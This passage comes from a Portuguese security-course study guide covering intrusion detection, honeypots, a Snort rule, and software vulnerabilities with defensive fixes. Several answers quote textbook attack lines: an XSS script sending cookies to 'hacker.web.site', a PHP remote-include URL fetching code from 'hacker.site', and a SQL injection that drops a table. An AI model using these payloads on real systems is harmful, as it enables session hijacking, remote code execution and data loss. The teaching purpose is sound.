analisador minimiza a sobreposição.</p><p><strong>D6.</strong> A interpretação frouxa pega mais intrusos e produz muitos falsos positivos (usuários autorizados marcados). A estrita limita os falsos positivos e aumenta os falsos negativos (intrusos perdidos). Objetivo: maximizar a taxa de detecção, minimizar a taxa de falsos alarmes; um compromisso e uma arte. Visão clássica: externos são distinguíveis com confiança razoável a partir de padrões históricos e desvios significativos; internos são os mais difíceis (Anderson), a diferença entre seu comportamento anormal e normal é minúscula, anomalias sozinhas são insuficientes, então usar regras de uso não autorizado definidas com inteligência. Falácia da taxa-base: intrusões são muito raras comparadas ao uso legítimo, então a menos que o IDS seja quase perfeito a taxa de falsos alarmes é alta; falsos alarmes frequentes são ignorados ou desperdiçam tempo, uma taxa de detecção baixa dá falsa segurança.</p><p><strong>D7.</strong> Rodar continuamente com supervisão mínima; tolerante a falhas, recupera-se de quedas; resiste a subversão, monitora a si mesmo; sobrecarga mínima; configurável conforme a política de segurança; adapta-se a mudanças no comportamento do sistema e dos usuários; escala para muitos hosts; evita parada completa do serviço quando componentes falham; reconfiguração dinâmica sem reinicialização.</p><p><strong>D8.</strong> A fase de treinamento constrói o modelo de comportamento legítimo a partir dos dados dos sensores em operação normal (em momentos distintos ou continuamente); a fase de detecção compara o comportamento observado com o modelo e o classifica. Estatística: univariada (grosseira), multivariada (correlações), série temporal (ordem e tempo); simples, barata, sem suposições; difícil escolher métricas, nem todo comportamento se encaixa. Baseada em conhecimento: regras de sistema especialista, possivelmente manuais, máquinas de estados finitos e linguagens de descrição; robusta e flexível; regras lentas e difíceis de escrever, exigem especialistas humanos. Aprendizado de máquina: mineração de dados constrói o modelo a partir de dados normais de treinamento; flexível, adaptável, captura interdependências complexas, eficiente depois de treinado; depende de suposições sobre o comportamento aceito, taxa de falsos alarmes atualmente inaceitável, o treinamento custa muito tempo e recursos. Abordagens: redes bayesianas, modelos de Markov, redes neurais, lógica fuzzy, algoritmos genéticos, agrupamento e detecção de outliers.</p><p><strong>D9.</strong> Detecção de mau uso: um conjunto de padrões maliciosos conhecidos ou regras de ataque; uma correspondência significa um intruso. Assinaturas comparam dados com padrões maliciosos conhecidos, detalhadas o bastante para limitar falsos alarmes e ainda pegar o suficiente; usadas em antivírus, proxies de varredura de tráfego, NIDS; baixo custo, ampla aceitação; esforço significativo para construir assinaturas, sem dia zero. Heurísticas usam regras para ataques conhecidos ou fraquezas conhecidas e comportamento suspeito mesmo dentro de padrões normais; a melhor fonte é analisar ferramentas e scripts de ataque da Internet mais regras de especialistas; específicas de máquina e SO. O Snort é o NIDS baseado em regras com uma grande coleção de regras.</p><p><strong>D10.</strong> Dia zero: assinatura não, anomalia possível. Falsos positivos: assinatura baixos, anomalia mais altos (sobreposição, taxa-base, ML inaceitável hoje). Custo: assinatura baixo em execução, esforço para escrever e revisar; anomalia depende, estatística barata, baseada em conhecimento exige especialistas, ML caro para treinar depois eficiente. Adaptabilidade: assinatura precisa de uma nova assinatura por ataque; anomalia evolui com o comportamento, ML flexível; requisito 6 de um IDS.</p><p><strong>D11.</strong> Uma camada especializada de software de segurança em sistemas vulneráveis ou sensíveis (servidores de banco de dados, sistemas administrativos), monitorando a atividade interna; detectar intrusões, registrar eventos suspeitos, enviar alertas; as duas abordagens. Rastros de chamadas de sistema: preferidos, funcionam em Unix e Linux, problemáticos no Windows porque as DLLs obscurecem qual processo chama o quê. Registros de auditoria: já coletados pelo SO, sem software extra; podem faltar informação ou formato, intrusos os manipulam. Somas de verificação de integridade de arquivos: hash periódico de arquivos críticos contra uma linha de base; as somas corretas precisam ser geradas e protegidas, arquivos que mudam legitimamente são difíceis. Acesso ao Registro: Windows, muita atividade de programas ali; muito específico, sucesso limitado. Sensor: coletar, filtrar para um formato padrão, encaminhar.</p><p><strong>D12.</strong> A maior parte do trabalho de HIDS de anomalia foi em UNIX e Linux, coleta de dados fácil; chamadas de sistema são a forma de os programas alcançarem o kernel e dão atividade detalhada dos processos. O STIDE compara as sequências de chamadas observadas com as sequências normais do treinamento para uma razão de discordância. Alternativas: HMM, ANN, SVM, ELM. Desempenho: taxa de detecção, falsos positivos, velocidade de detecção. O HIDS por assinatura é a base do antivírus, em PCs, celulares, proxies de e-mail e web, NIDS; assinaturas (padrões de arquivo de malware conhecido) e heurísticas (regras de comportamento malicioso conhecido); muito eficiente em malware conhecido, não detecta dia zero; amplamente usado no Windows.</p><p><strong>D13.</strong> Monitora o tráfego em pontos selecionados, pacote a pacote, em tempo real ou próximo, em L3, L4 e L7. O NIDS examina o tráfego de pacotes dirigido aos sistemas, o HIDS examina a atividade de usuários e software dentro de um host. Parte da infraestrutura de perímetro, no firewall ou ao lado dele, focado em tentativas externas. Sensores, servidores de gerência, consoles de gerência. Com TLS/SSL o NIDS perdeu acesso a carga útil significativa (não vê comandos em HTTPS); importante mas só parte da solução.</p><p><strong>D14.</strong> Em linha: no segmento, o tráfego passa por ele, pode ser combinado com um firewall ou switch, pode bloquear, atua como IDS e IPS. Passivo: o mais comum, monitora uma cópia, o tráfego real não passa, mais eficiente, sem atraso. Configuração: uma derivação no meio (fibra) dá uma cópia de todo o tráfego; NIC 1 na derivação, normalmente sem IP, modo promíscuo; NIC 2 com IP para o servidor de gerência. Sensores sem fio em linha em um AP ou passivos no ar; só eles veem ataques de protocolo sem fio (DoS sem fio, sequestro de sessão, AP falso); WIDS é um NIDS só para redes sem fio.</p><p><strong>D15.</strong> Sistemas-isca que atraem atacantes para longe dos sistemas críticos. Desviar, coletar informação sobre técnicas e ferramentas, ganhar tempo para os administradores responderem. Preenchido com informação fabricada de aparência valiosa que nenhum usuário legítimo acessa, então qualquer acesso é suspeito; instrumentado com monitores e registradores; o ataque parece ter sucesso então o atacante é rastreado sem expor a produção. Sem valor de produção: entrada é sondagem, varredura ou ataque; saída significa que foi comprometido. Baixa interação emula serviços, interação inicial realista, sem serviços completos; suficiente para os estágios iniciais e alertas em um IDS distribuído. Alta interação é um SO real com serviços reais, instrumentado; mais realista, prende o atacante por mais tempo; exige muito mais recursos, e se comprometido ataca outros, problemas jurídicos e de reputação. Honeynet Project: redes inteiras de honeypots emulando uma empresa com tráfego simulado.</p><p><strong>D16.</strong> Externo, antes do firewall: rastreia varreduras de IPs não usados, sem risco à rede interna, reduz o ruído no firewall e nos sensores internos; pouca captura de internos. DMZ: monitora ataques aos serviços públicos; risco de contaminação para os outros sistemas da DMZ; o firewall externo bloqueia a maior parte do tráfego (só 80 e 443), então ou abri-lo e aumentar o risco ou limitar o honeypot. Interno: captura ataques internos, o mais importante; detecta um firewall mal configurado; alto risco, um honeypot comprometido ataca sistemas internos, o firewall vê o tráfego do atacante como permitido, regras de exceção necessárias. Honeyfiles: documentos falsos com nomes realistas (&quot;Salarios Diretoria.xlsx&quot;) como isca; qualquer acesso é suspeito.</p><p><strong>D17.</strong> <code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET ![7680,1521]</code>: alert gera um alerta; tcp só TCP; $HOME_NET any, origem rede interna, qualquer porta; -&gt; sentido; $EXTERNAL_NET ![7680,1521], destino rede externa, exceto as portas 7680 e 1521. msg: a mensagem de log &quot;ET P2P BitTorrent peer sync&quot;. flow:established,to_server: só conexões TCP estabelecidas no sentido do servidor. content:&quot;|00 00 00 0d 06 00|&quot;: busca essa sequência de bytes. depth:6: só nos primeiros 6 bytes da carga útil. threshold: type limit, track by_dst, seconds 300, count 1: um alerta por destino a cada 300 s. reference: URL da documentação do protocolo BitTorrent. classtype:policy-violation: categoria. sid:2000334: ID único. rev:14: revisão 14. metadata: criada em 2010_07_30, confiança Medium, severidade Informational, atualizada em 2025_06_30.</p><p><strong>D18.</strong> Tráfego de rede, decodificador de pacotes, pré-processador, motor de detecção com as regras, sistema de registro e alerta, módulos de saída, saída como alerta ou log. A regra é detecção por assinatura: um padrão fixo de bytes em uma posição fixa em um estado de protocolo conhecido, sem linha de base, sem treinamento; o Snort é o exemplo de NIDS baseado em regras.</p><p><strong>D19.</strong> O IDS detecta, registra e alerta, pode usar um sensor passivo em uma cópia do tráfego. O IPS bloqueia o ataque, precisa de um sensor em linha, arrisca bloquear tráfego legítimo em um falso positivo e acrescenta atraso. Filtro de pacotes: só cabeçalhos, sem carga útil, sem ataques de aplicação, log limitado, sem contexto entre pacotes, contornado por falsificação e fragmentos, nunca vê tráfego que o contorna nem internos; a detecção precisa de carga útil, sequências de pacotes e dados do host.</p><p><strong>D20.</strong> Chamadas de sistema: HIDS, a fonte preferida, STIDE. Varredura de portas: NIDS, um padrão pelo segmento. Exploit web: NIDS com assinaturas, mas HIDS no servidor quando HTTPS cega o NIDS. Arquivos sensíveis: HIDS, somas de verificação, registros de auditoria, honeyfiles. A combinação (IDS distribuído ou híbrido) ajuda mais no servidor web: o NIDS vê a requisição, o HIDS vê o efeito e cobre HTTPS; e na exfiltração depois do acesso a arquivos, visível só na rede.</p><h3 id="_7-3-baralho-v-vulnerabilidades-de-software" tabindex="-1"><span class="cut mono-1 wght-5 slnt-0 step-3">7</span><span class="cut mono-2 wght-5 slnt-1 step-1">.</span><span class="cut mono-0 wght-4 slnt-1 step-1">3</span> <span class="cut mono-2 wght-0 slnt-5 step-2">B</span><span class="cut mono-2 wght-3 slnt-4 step-1">a</span><span class="cut mono-4 wght-3 slnt-4 step-0">r</span><span class="cut mono-0 wght-3 slnt-2 step-0">a</span><span class="cut mono-5 wght-2 slnt-0 step-1">l</span><span class="cut mono-2 wght-4 slnt-3 step-3">h</span><span class="cut mono-3 wght-3 slnt-0 step-0">o</span> <span class="cut mono-3 wght-1 slnt-3 step-3">V</span><span class="cut mono-0 wght-4 slnt-1 step-1">:</span> <span class="cut mono-5 wght-1 slnt-5 step-2">v</span><span class="cut mono-1 wght-1 slnt-5 step-2">u</span><span class="cut mono-5 wght-0 slnt-5 step-0">l</span><span class="cut mono-2 wght-1 slnt-2 step-3">n</span><span class="cut mono-3 wght-3 slnt-3 step-1">e</span><span class="cut mono-2 wght-3 slnt-4 step-0">r</span><span class="cut mono-0 wght-1 slnt-2 step-0">a</span><span class="cut mono-5 wght-2 slnt-3 step-1">b</span><span class="cut mono-4 wght-2 slnt-5 step-3">i</span><span class="cut mono-2 wght-0 slnt-2 step-2">l</span><span class="cut mono-5 wght-0 slnt-0 step-2">i</span><span class="cut mono-2 wght-5 slnt-2 step-0">d</span><span class="cut mono-2 wght-4 slnt-0 step-2">a</span><span class="cut mono-4 wght-5 slnt-2 step-1">d</span><span class="cut mono-0 wght-4 slnt-3 step-1">e</span><span class="cut mono-2 wght-1 slnt-4 step-1">s</span> <span class="cut mono-3 wght-0 slnt-3 step-2">d</span><span class="cut mono-2 wght-4 slnt-4 step-2">e</span> <span class="cut mono-0 wght-4 slnt-4 step-3">s</span><span class="cut mono-4 wght-0 slnt-4 step-2">o</span><span class="cut mono-1 wght-1 slnt-4 step-2">f</span><span class="cut mono-4 wght-3 slnt-5 step-3">t</span><span class="cut mono-5 wght-4 slnt-4 step-1">w</span><span class="cut mono-2 wght-0 slnt-0 step-3">a</span><span class="cut mono-3 wght-2 slnt-1 step-1">r</span><span class="cut mono-2 wght-1 slnt-5 step-0">e</span> <a class="header-anchor" href="#_7-3-baralho-v-vulnerabilidades-de-software" aria-hidden="true">#</a></h3><h4 id="perguntas-2" tabindex="-1"><span class="cut mono-0 wght-3 slnt-3 step-0">P</span><span class="cut mono-2 wght-4 slnt-2 step-0">e</span><span class="cut mono-5 wght-4 slnt-2 step-3">r</span><span class="cut mono-0 wght-3 slnt-4 step-1">g</span><span class="cut mono-5 wght-4 slnt-5 step-2">u</span><span class="cut mono-2 wght-1 slnt-0 step-3">n</span><span class="cut mono-1 wght-1 slnt-4 step-1">t</span><span class="cut mono-5 wght-2 slnt-3 step-3">a</span><span class="cut mono-2 wght-1 slnt-0 step-2">s</span> <a class="header-anchor" href="#perguntas-2" aria-hidden="true">#</a></h4><p><strong>V1.</strong> A raiz do problema. As cinco falhas de código do OWASP Top 10. As três categorias do CWE/SANS Top 25 com dois exemplos cada.</p><p><strong>V2.</strong> Como a segurança de software difere da qualidade de software? Quem escolhe a distribuição de probabilidade?</p><p><strong>V3.</strong> Defina programação defensiva e sua regra principal. O que o software faz sob ataque?</p><p><strong>V4.</strong> Por que os programadores não escrevem de forma defensiva? Pressão de negócio, manutenção, mentalidade, maturidade, normas.</p><p><strong>V5.</strong> As quatro áreas críticas de interação. Defina entrada e suas fontes. Duas preocupações.</p><p><strong>V6.</strong> Estouro de buffer: a suposição, a consequência, por que os testes o perdem, as correções.</p><p><strong>V7.</strong> O exemplo em C da aula: o que estoura sobre o quê, por quê, o que o GCC imprime, qual flag reproduz o ataque.</p><p><strong>V8.</strong> Interpretação da entrada: binário versus texto, Heartbleed, conjuntos de caracteres.</p><p><strong>V9.</strong> Ataques de injeção: definição, mecanismo, onde são comuns. Exemplo de injeção de SQL, entrada e prevenção.</p><p><strong>V10.</strong> Injeção de código em PHP: o cenário do include, o exemplo GET, os dois recursos do PHP, as defesas. Desserialização insegura.</p><p><strong>V11.</strong> XSS: o exemplo do cookie, ofuscação, prevenção, a natureza da falha, o alvo real.</p><p><strong>V12.</strong> Lista branca versus lista negra. Canonicalização com o exemplo do &quot;/&quot;. A vulnerabilidade de conversão de tipo. Fuzzing.</p><p><strong>V13.</strong> Falhas de algoritmo: quatro exemplos históricos. Riscos e defesas de memória e concorrência.</p><p><strong>V14.</strong> Interação com o SO: variáveis de ambiente e seus ataques, práticas de menor privilégio, modularização, chroot, apagamento seguro de arquivos.</p><p><strong>V15.</strong> Saída: o problema da origem comum, dois ataques pela saída, três mitigações.</p><h4 id="respostas-2" tabindex="-1"><span class="cut mono-0 wght-0 slnt-0 step-2">R</span><span class="cut mono-5 wght-5 slnt-1 step-0">e</span><span class="cut mono-0 wght-3 slnt-3 step-2">s</span><span class="cut mono-3 wght-0 slnt-3 step-2">p</span><span class="cut mono-3 wght-5 slnt-3 step-3">o</span><span class="cut mono-4 wght-1 slnt-2 step-2">s</span><span class="cut mono-4 wght-1 slnt-5 step-0">t</span><span class="cut mono-2 wght-2 slnt-5 step-3">a</span><span class="cut mono-5 wght-2 slnt-1 step-2">s</span> <a class="header-anchor" href="#respostas-2" aria-hidden="true">#</a></h4><p>Fonte: Parte 3.</p><p><strong>V1.</strong> Más práticas de programação causam muitas vulnerabilidades; a consciência é o primeiro passo. OWASP: entrada não validada, XSS, estouro de buffer, falhas de injeção, tratamento de erro inadequado. CWE/SANS: interação insegura entre componentes (injeção de SQL, injeção de comando do SO, XSS, CSRF, upload perigoso, open redirect); gerência arriscada de recursos (estouro de buffer, path traversal, download sem verificação de integridade, função perigosa, cálculo errado do tamanho do buffer, string de formato, estouro de inteiro); defesas porosas (falta de autenticação ou autorização, credenciais fixas no código, falta de cifragem, entrada não confiável em decisão de segurança, privilégios desnecessários, criptografia quebrada, tentativas de login ilimitadas, hash sem sal).</p><p><strong>V2.</strong> Qualidade: falhas seguem alguma distribuição de probabilidade; projeto estruturado e testes sobre entradas prováveis removem a maioria dos bugs; o que importa é com que frequência os bugs disparam. Segurança: o atacante escolhe a distribuição, mirando bugs exploráveis disparados por entradas longe do esperado, então testes comuns os perdem. Código seguro não supõe nada e verifica todo erro.</p><p><strong>V3.</strong> Projetar e implementar software de modo que continue funcionando sob ataque; detecta condições errôneas causadas por um ataque e continua com segurança ou falha de forma graciosa. Regra: nunca supor nada, verificar toda suposição, tratar todo estado de erro possível.</p><p><strong>V4.</strong> Programadores focam nos passos para o sucesso e no fluxo normal, não nos pontos de falha; o tratamento de erros acrescenta código e tempo, conflitando com prazos curtos e vantagem de mercado; a menos que a segurança seja um objetivo de projeto desde o início, um programa seguro é improvável. Manutenção: verificar suposições, erros e interações com o código existente, ou um programa seguro vira vulnerável. Mentalidade: não &quot;a maioria dos usuários, na maior parte do tempo&quot;; paranoia é uma virtude; testes normais perdem entradas incomuns; resiliência a qualquer condição inesperada. Maturidade: a sociedade tolera falha de software muito mais que pontes que desabam; as normas ISO 12207 e SEI06 nomeiam a segurança como objetivo de projeto; o SAFECode publica melhores práticas; a modelagem de ameaças pertence ao projeto.</p><p><strong>V5.</strong> Tratamento da entrada, implementação do algoritmo, interação com outros componentes, saída. Entrada: qualquer dado de fora do programa cujo valor o programador não conhece ao codificar; fontes óbvias teclado, mouse, arquivos, rede; fontes indiretas ambiente, arquivos de configuração, valores do SO. Preocupações: tamanho, e significado ou interpretação.</p><p><strong>V6.</strong> Suposição de um tamanho máximo, buffers fixos de 512 ou 1024 bytes, nenhuma verificação de que a entrada cabe; o estouro compromete a execução; os testes usam entradas esperadas e raramente entradas grandes o bastante; rotinas de biblioteca podem não limitar cópias. Correções: rotinas seguras de cópia, tratar toda entrada como perigosa, buffers dinâmicos ou processamento em blocos do tamanho do buffer, verificar a memória pedida contra a disponível, falhar de forma graciosa (blocos, descartar o excesso, terminar), verificar em todo ponto de entrada de dados desconhecidos.</p><p><strong>V7.</strong> <code>var_outrasInfos[10]</code> e <code>var_nome[10]</code> ficam na pilha; <code>my_gets</code> copia caracteres até a quebra de linha sem verificar o comprimento; mais de 10 caracteres estouram sobre <code>var_nome</code>, então &quot;Gabriel&quot; é sobrescrito pelo excesso. Uma entrada longa então dispara <code>*** stack smashing detected ***: terminated</code> e SIGABRT: uma proteção do GCC detectou a pilha corrompida no retorno da função. Reproduza o ataque clássico com <code>gcc -fno-stack-protector</code>, depois leia <code>man 7 signal</code>.</p><p><strong>V8.</strong> Dados binários são supostos inteiros, floats, strings ou estruturas, e a suposição precisa ser validada conforme os valores são lidos (Ethernet, IP, TCP; DNS, SNMP, NFS contra sua sintaxe abstrata). Heartbleed, OpenSSL 2014: nenhuma verificação do comprimento pedido contra os dados fornecidos, uma leitura excessiva de buffer, vazou nomes de usuário, senhas e chaves privadas. Texto: bytes viram caracteres por um conjunto de caracteres (ASCII, extensões do Windows e do macOS, internacionalização); identificar o conjunto, depois o significado (inteiro, nome de arquivo, URL, e-mail) e confirmar o tipo, ou o atacante influencia o programa.</p><p><strong>V9.</strong> Uma classe ampla de falhas por tratamento inválido de entrada em que a entrada influencia o fluxo de execução; mecanismo comum: entrada passada como parâmetro a um programa auxiliar cuja saída é usada; frequente em linguagens de script (Perl, PHP, Python, sh) e em scripts CGI web que processam formulários HTML. Injeção de SQL: <code>$query = &quot;SELECT * FROM suppliers WHERE name = &#39;&quot; . $name . &quot;&#39;;&quot;</code>; a entrada <code>Bob</code> funciona, a entrada <code>Bob&#39;; drop table suppliers</code> retorna o registro e apaga a tabela; metacaracteres SQL. Prevenção: validar (escapar ou rejeitar), funções de sanitização, placeholders ou parâmetros SQL em vez de concatenação, stored procedures.</p><p><strong>V10.</strong> <code>include $path . &#39;functions.php&#39;</code>: o script é chamado diretamente; o PHP atribuía variáveis globais a partir da requisição HTTP e <code>include</code> aceitava URLs remotas; <code>GET /calendar/embed/day.php?path=http://hacker.site/hack.txt?&amp;cmd=ls</code> faz de <code>$path</code> a URL do atacante e roda código remoto com os privilégios do servidor web. Defesas: bloquear a atribuição automática de campos de formulário a globais (array, buscar por nome; pode quebrar código legado); só constantes em include e require, ou validar logo antes do uso; identificar todas as entradas, validar suposições, entender como cada função interpreta seus argumentos. Variantes: injeção de e-mail, string de formato, injeção de interpretador. Desserialização: um fluxo de bytes reconstruído em um objeto; aceitar objetos serializados de fontes não confiáveis deixa um fluxo manipulado rodar a lógica do atacante durante a reconstrução, muitas vezes RCE.</p><p><strong>V11.</strong> Um comentário de livro de visitas com <code>&lt;script&gt;document.location=&#39;http://hacker.web.site/ cookie.cgi?&#39;+document.cookie&lt;/script&gt;</code> envia o cookie do próximo visitante ao atacante, que o personifica. Ofuscação com entidades HTML (<code>&amp;#60;&amp;#115;...</code>), interpretadas de forma idêntica pelo navegador. Prevenção: examinar a entrada, remover ou escapar código perigoso, os validadores traduzem as entidades antes de verificar; sanitizar a saída. Uma falha de tratamento tanto da entrada quanto da saída; o alvo é o próximo usuário, não o servidor; relacionada a CSRF e HTTP response splitting.</p><p><strong>V12.</strong> A lista branca compara com o que se quer e aceita só o válido: recomendada. A lista negra compara com valores perigosos conhecidos e falha a cada nova evasão. Normalmente expressões regulares; em caso de falha rejeitar ou sanitizar. Canonicalização: caracteres têm várias codificações (HTML, UTF-8); &quot;/&quot; tem formas além de 2F; codificações longas contornaram filtros (IIS, anos 1990); reduzir a entrada a uma forma padrão única e mínima antes da validação; usar bibliotecas anti-XSS ou frameworks. Conversão de tipo: um tamanho lido como sem sinal e comparado como com sinal; um valor com o bit mais alto ligado é lido como negativo, passa na verificação de máximo, estoura na alocação ou cópia. Fuzzing: Barton Miller 1989, entrada aleatória para encontrar travamentos; simples, barato, sem suposições, encontra falhas exploráveis; pode perder bugs que exigem condições específicas; usado por desenvolvedores e atacantes.</p><p><strong>V13.</strong> O gerador aleatório previsível do Netscape quebrou sua criptografia; sequestro de sessão TCP por números de sequência iniciais previsíveis; Ken Thompson 1984, um compilador malicioso inserindo backdoors invisíveis; o Morris Worm usando o comando DEBUG do sendmail. Memória: a tipagem fraca do C permite manipulação de ponteiros, estouros e estruturas corrompidas; defesa: tipagem forte ou conversões validadas; vazamentos de memória não liberada levam a esgotamento e DoS, gerência automática preferível. Concorrência: condições de corrida corrompem valores compartilhados sem sincronização; mau uso de primitivas causa impasse, que atacantes disparam para DoS; escolher primitivas corretamente, limitar as áreas compartilhadas.</p><p><strong>V14.</strong> O SO constrói o ambiente do processo (código, dados, argumentos, variáveis de ambiente), tudo entrada externa a validar; permissões por usuário e grupo, acesso excessivo é perigoso. Variáveis de ambiente herdadas do pai (PATH, IFS, LD_LIBRARY_PATH): o ataque ao PATH roda um <code>grep</code> falso a partir de um script privilegiado; LD_LIBRARY_PATH carrega bibliotecas maliciosas; mitigação: sem scripts de shell privilegiados, encapsuladores compilados que limpam o ambiente, redefinir variáveis críticas no início. Menor privilégio: privilégios mínimos; um programa root comprometido dá controle total; preferir privilégios de grupo; servidores web não devem ser donos de todos os seus arquivos; usar root só para vincular portas baixas e depois abandonar. Modularização: módulos pequenos, privilégio elevado só onde necessário e brevemente (Postfix). A jaula chroot limita a visão do sistema de arquivos a um diretório; difícil de configurar, escape ou falha se errada. Apagamento seguro: sobrescrever um arquivo não o apaga por causa dos buffers de E/S, buffers do sistema de arquivos e controladores inteligentes (SSDs evitam reescrever o mesmo bloco); forçar flush e sync.</p><p><strong>V15.</strong> A saída é binária ou textual e precisa corresponder estritamente ao formato esperado; os usuários supõem que o programa confiável a gerou e validou, o que falha quando a entrada de um usuário é mostrada a outro (comentários, fóruns) sem sanitização. Ataques: sequências de escape VT100 reprogramavam teclas de função para rodar comandos quando o texto era visto; XSS roda JavaScript de terceiros no navegador da vítima pela confiança do navegador no site. Mitigação: o programa que retransmite é responsável, lista branca de conteúdo seguro; especificar a codificação de caracteres explicitamente (Content-Type) para o navegador não supor um padrão inseguro; o alvo é o usuário ou o dispositivo de exibição, não o servidor, mas a reputação do software sofre.</p><h2 id="_8-esqueletos-de-dissertativa" tabindex="-1"><span class="cut mono-1 wght-2 slnt-4 step-2">8</span><span class="cut mono-1 wght-4 slnt-4 step-2">.</span> <span class="cut mono-1 wght-2 slnt-0 step-2">E</span><span class="cut mono-0 wght-0 slnt-0 step-1">s</span><span class="cut mono-2 wght-5 slnt-1 step-3">q</span><span class="cut mono-4 wght-2 slnt-4 step-3">u</span><span class="cut mono-1 wght-2 slnt-3 step-2">e</span><span class="cut mono-5 wght-4 slnt-3 step-1">l</span><span class="cut mono-0 wght-3 slnt-3 step-3">e</span><span class="cut mono-0 wght-4 slnt-2 step-2">t</span><span class="cut mono-1 wght-5 slnt-2 step-3">o</span><span class="cut mono-4 wght-4 slnt-0 step-0">s</span> <span class="cut mono-0 wght-5 slnt-2 step-0">d</span><span class="cut mono-0 wght-1 slnt-1 step-1">e</span> <span class="cut mono-2 wght-1 slnt-2 step-0">d</span><span class="cut mono-2 wght-2 slnt-2 step-0">i</span><span class="cut mono-2 wght-0 slnt-1 step-3">s</span><span class="cut mono-5 wght-0 slnt-2 step-2">s</span><span class="cut mono-5 wght-3 slnt-5 step-0">e</span><span class="cut mono-1 wght-4 slnt-1 step-2">r</span><span class="cut mono-2 wght-2 slnt-3 step-1">t</span><span class="cut mono-0 wght-3 slnt-1 step-3">a</span><span class="cut mono-3 wght-2 slnt-1 step-3">t</span><span class="cut mono-2 wght-2 slnt-4 step-2">i</span><span class="cut mono-0 wght-0 slnt-2 step-0">v</span><span class="cut mono-1 wght-5 slnt-2 step-0">a</span> <a class="header-anchor" href="#_8-esqueletos-de-dissertativa" aria-hidden="true">#</a></h2><p>Toda resposta longa tem as mesmas quatro partes.</p><ol><li>Qual problema o mecanismo resolve.</li><li>Como funciona, uma frase, com o número.</li><li>Como falha, ou o que não fornece.</li><li>A correção, ou o substituto moderno.</li></ol><p><strong>E1. &quot;Filtro de pacotes sem estado versus com estado.&quot;</strong></p><ul><li><strong>Problema:</strong> deixar entrar as respostas a clientes internos sem abrir toda porta alta.</li><li><strong>Como:</strong> regras sem estado sobre cabeçalhos L3 e L4, Tabela 9.1 com 5 regras; a regra de resposta precisa permitir destino &gt; 1023 na entrada; refinamentos com porta de origem 25 e o flag ACK.</li><li><strong>Falha:</strong> sem contexto, um atacante alcança a porta 8080 a partir da porta 5150, ou envia da porta de origem 25; sem carga útil, log limitado, falsificação, fragmentos minúsculos, erro de configuração.</li><li><strong>Correção:</strong> a tabela de estado das conexões de saída ativas, entrada para portas altas só com correspondência; rastreamento de números de sequência; DPI limitado para FTP, IM, SIPS. Para ataques de aplicação, um proxy de aplicação.</li></ul><p><strong>E2. &quot;Filtro positivo versus filtro negativo.&quot;</strong></p><ul><li><strong>Problema:</strong> decidir a postura do firewall para tráfego que nenhuma regra menciona.</li><li><strong>Como:</strong> o filtro positivo permite o tráfego listado e termina com deny (descarte padrão, &quot;não permitido é proibido&quot;); o filtro negativo nega o tráfego listado e termina com allow (encaminhamento padrão, &quot;não proibido é permitido&quot;).</li><li><strong>Falha:</strong> o positivo é visível aos usuários como obstáculo e precisa de uma regra por serviço; o negativo deixa aberto todo serviço esquecido e o administrador reage a cada nova ameaça; &quot;outros: não&quot; exige faixas de portas.</li><li><strong>Correção:</strong> filtro positivo para empresas e governo e para qualquer servidor com uma tabela de requisitos; negativo só em organizações abertas como universidades. As regras derivam da política, que deriva da avaliação de risco.</li></ul><p><strong>E3. &quot;Detecção por assinatura versus por anomalia.&quot;</strong></p><ul><li><strong>Problema:</strong> decidir se o comportamento observado é uma intrusão, com a sobreposição entre comportamento de intruso e de usuário e a falácia da taxa-base.</li><li><strong>Como:</strong> assinaturas comparam dados com padrões maliciosos conhecidos (regra do Snort com um content de 6 bytes); anomalia constrói uma linha de base em uma fase de treinamento e marca desvios na fase de detecção (estatística, baseada em conhecimento, aprendizado de máquina).</li><li><strong>Falha:</strong> assinaturas perdem dia zero e exigem trabalho constante de assinaturas; anomalia produz mais falsos alarmes (taxa de ML inaceitável hoje), exige treinamento e boas métricas, e não separa internos (Anderson).</li><li><strong>Correção:</strong> usar as duas, em HIDS e NIDS, em um IDS distribuído, dentro da defesa em profundidade com criptografia, trilhas de auditoria, autenticação forte.</li></ul><p><strong>E4. &quot;HIDS versus NIDS, e o problema da criptografia.&quot;</strong></p><ul><li><strong>Problema:</strong> cobrir tanto o perímetro da rede quanto a atividade dentro de hosts sensíveis.</li><li><strong>Como:</strong> o NIDS examina pacotes em pontos selecionados em L3, L4, L7, por sensores em linha ou passivos (derivação, NIC sem IP); o HIDS examina rastros de chamadas de sistema, registros de auditoria, somas de verificação de arquivos, Registro em um host.</li><li><strong>Falha:</strong> o NIDS é cego dentro de TLS/SSL e não vê nada que contorna a rede; o HIDS cobre um host, custa seus recursos, e intrusos editam seus logs; chamadas de sistema são problemáticas no Windows.</li><li><strong>Correção:</strong> IDS distribuído ou híbrido com um analisador central; HIDS nos pontos finais para dados decifrados; terminar a cifragem no firewall ou proxy e colocar o sensor depois; honeypots para desviar e observar.</li></ul><p><strong>E5. &quot;Estouro de buffer e programação defensiva.&quot;</strong></p><ul><li><strong>Problema:</strong> entrada maior do que o programador supôs corrompe a memória e deixa o atacante escolher a falha.</li><li><strong>Como:</strong> um buffer fixo (512, 1024 ou os 10 bytes do exemplo) preenchido por uma rotina sem verificação de comprimento; o excesso sobrescreve variáveis adjacentes ou o endereço de retorno; o protetor de pilha do GCC aborta com &quot;stack smashing detected&quot;, desabilitado por <code>-fno-stack-protector</code>.</li><li><strong>Falha:</strong> testes comuns usam entradas esperadas; rotinas de biblioteca não limitam cópias; a tipagem fraca do C permite; conversões de sem sinal para com sinal derrotam verificações de tamanho; Heartbleed é o lado da leitura.</li><li><strong>Correção:</strong> programação defensiva, não supor nada e verificar tudo; rotinas seguras de cópia, buffers dinâmicos, processamento em blocos, falha graciosa; validar toda fonte de entrada, lista branca, canonicalizar primeiro; fuzzing; linguagens fortemente tipadas; menor privilégio para que um comprometimento ganhe pouco.</li></ul><h2 id="_9-simulado-45-minutos-sem-consulta" tabindex="-1"><span class="cut mono-5 wght-3 slnt-2 step-2">9</span><span class="cut mono-1 wght-0 slnt-4 step-1">.</span> <span class="cut mono-0 wght-5 slnt-4 step-0">S</span><span class="cut mono-4 wght-1 slnt-2 step-0">i</span><span class="cut mono-4 wght-1 slnt-4 step-3">m</span><span class="cut mono-0 wght-5 slnt-0 step-2">u</span><span class="cut mono-5 wght-5 slnt-4 step-3">l</span><span class="cut mono-5 wght-1 slnt-5 step-3">a</span><span class="cut mono-1 wght-3 slnt-0 step-1">d</span><span class="cut mono-2 wght-3 slnt-3 step-2">o</span> <span class="cut mono-4 wght-1 slnt-4 step-3">(</span><span class="cut mono-5 wght-3 slnt-1 step-2">4</span><span class="cut mono-4 